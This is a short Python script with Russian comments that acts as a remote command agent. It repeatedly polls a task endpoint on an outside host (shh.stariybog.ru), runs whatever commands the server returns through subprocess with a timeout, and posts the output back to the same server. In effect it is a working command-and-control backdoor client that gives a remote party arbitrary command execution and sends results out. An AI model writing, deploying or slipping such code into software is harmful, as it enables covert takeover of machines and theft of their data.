import requests
import json
import subprocess
import threading
import time

def command_executor(command, result_container, timeout_event):
	try:
		# Запускаем команду
		process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
		
		# Ждем завершения процесса или таймаута
		start_time = time.time()
		while True:
			if timeout_event.is_set():
				process.kill()  # Убиваем процесс, если сработал таймаут
				result_container['result'] = "TimeError"
				result_container['error'] = 0
				return
			
			if process.poll() is not None:  # Процесс завершился
				stdout, stderr = process.communicate()
				result_container['result'] = stdout if process.returncode == 0 else stderr
				result_container['error'] = 1 if process.returncode == 0 else 0
				return
			
			time.sleep(0.1)  # Небольшая задержка, чтобы избежать нагрузки на CPU

	except Exception as e:
		result_container['result'] = str(e)
		result_container['error'] = 0

def run_command_in_thread(command, timeout):
	result_container = {'result': '', 'error': None}
	timeout_event = threading.Event()
	
	thread = threading.Thread(target=command_executor, args=(command, result_container, timeout_event))
	thread.start()
	
	# Ждем завершения потока с таймаутом
	thread.join(timeout)
	
	if thread.is_alive():  # Если поток все еще жив, остановим выполнение
		timeout_event.set()  # Сигнализирует потоку, что время истекло
		thread.join()  # Ждем завершения потока

	return result_container['result'], result_container['error']

def main_parser(cfg_data):
	print('never gonna give u up')
	command_executor("chcp 65001", {'result': '', 'error': None}, threading.Event())

	while True:
		r = requests.get("https://shh.stariybog.ru/taskpoll?auth_key={}&wait_time=25".format(cfg_data['code']))
		data = json.loads(r.content)

		for i in data:
			response = run_command_in_thread(i['command'], timeout=10)  # Задаем таймаут в секундах
			r = requests.get('https://shh.stariybog.ru/complete_task?auth_key={}'.format(cfg_data['code']),
				params={
					'error': response[1],
					'result': response[0],
					'task_id': i['id']
				}
			)
			print(response)
			print(r, r.url)

